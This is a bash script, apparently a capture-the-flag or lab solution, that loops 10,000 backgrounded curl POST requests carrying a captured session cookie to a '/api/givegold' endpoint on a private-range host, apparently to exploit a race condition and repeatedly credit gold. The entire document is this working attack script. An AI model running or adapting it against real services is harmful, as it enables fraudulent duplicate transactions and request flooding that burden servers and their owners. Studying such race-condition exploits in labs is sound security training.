#!/bin/bash
# Loop a curl request and make the request pretty much asyncronous by using &. sleep for .1 to give the server some breathing room.

for i in {1..10000}; do sleep .1; curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.44.102' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://10.10.44.102/giving.html' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 19' -H $'DNT: 1' -H $'Connection: close' -H $'Cookie: connect.sid=s%3A1_QrOdmwhf3pJserjzFqbCWZAqIYR8fv.vb7X%2BTckrABMYXkszRkdjHm59MnUjLGo9jPnfbBaCc0' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'connect.sid=s%3A1_QrOdmwhf3pJserjzFqbCWZAqIYR8fv.vb7X%2BTckrABMYXkszRkdjHm59MnUjLGo9jPnfbBaCc0' \
    --data-binary $'user=test2&amount=1' \
    $'http://10.10.44.102/api/givegold' & done
